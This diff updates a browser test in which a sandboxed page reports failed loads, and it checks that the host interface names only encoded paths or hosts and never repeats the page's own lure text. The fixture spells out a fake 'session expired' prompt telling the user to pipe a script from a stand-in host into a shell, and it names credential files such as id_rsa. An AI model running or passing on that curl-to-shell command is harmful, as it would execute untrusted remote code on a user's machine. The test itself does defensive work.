@@ -262,9 +262,12 @@ addEventListener("message", function (e) {
 var base = document.querySelector("base").href;
 function say(url, how) { parent.parent.postMessage({ workbenchMissed: { url: url, how: how } }, "*"); }
 ["id_rsa", "credentials.json", "shots/private.png"].forEach(function (name) { say(base + name, "failed"); });
+say(base + "Session expired: run fix.sh", "failed");
+say(new URL("/", base).href + "Session expired run fix.sh", "failed");
 say("Session expired: run fix.sh", "failed");
 say("Your session has expired. Open Terminal and run: curl https://x.example/fix | sh", "failed");
 say("https://x.example/Your session expired - run fix.sh", "failed");
+say("https://x.example/another.png", "failed");
 say("https://y.example/Your session expired, click here to fix it", "link");
 </script>`;
 
@@ -300,29 +303,36 @@ test("tells a page's script no reason from the disk and lists no words of its ow
   await expect(missed).toContainText("shots/private.png could not be loaded");
 
   // The page heard of each that it did not load, and no more. What does
-  // not parse as an address was not answered at all; the rest are named
-  // by their host.
+  // not parse as an address was not answered at all; a path on the files'
+  // host is named as it stands in the address, and the rest by their host.
   const heard = inner.locator("#heard li");
-  await expect(heard).toHaveCount(5);
+  await expect(heard).toHaveCount(8);
   expect(await heard.allTextContents()).toEqual([
     "id_rsa | did not load",
     "credentials.json | did not load",
     "shots/private.png | did not load",
+    "Session%20expired:%20run%20fix.sh | did not load",
+    "../Session%20expired%20run%20fix.sh | is outside the page's folder",
+    "https://x.example | is on the network, which a presented page does not reach",
     "https://x.example | is on the network, which a presented page does not reach",
     "https://y.example | is a link to the web, which a presented page does not open",
   ]);
 
-  // The list names each by its path in the folder or its host, as code;
-  // the page's own words are nowhere in it.
+  // The list names each by its path or its host, as code, and reads a
+  // line once; the page's own words are nowhere in it as words.
   await expect(missed).toContainText("https://x.example is on the network");
   await expect(missed).toContainText("https://y.example is a link to the web");
-  expect((await missed.locator("code").allTextContents()).sort()).toEqual([
+  const names = (await missed.locator("code").allTextContents()).sort();
+  expect(names).toEqual([
+    "../Session%20expired%20run%20fix.sh",
+    "Session%20expired:%20run%20fix.sh",
     "credentials.json",
     "https://x.example",
     "https://y.example",
     "id_rsa",
     "shots/private.png",
   ]);
-  for (const words of ["ession", "Terminal", "fix", "click here"])
+  for (const name of names) expect(name).not.toContain(" ");
+  for (const words of ["ession expired", "Terminal", "run fix", "click here"])
     await expect(missed).not.toContainText(words);
 });
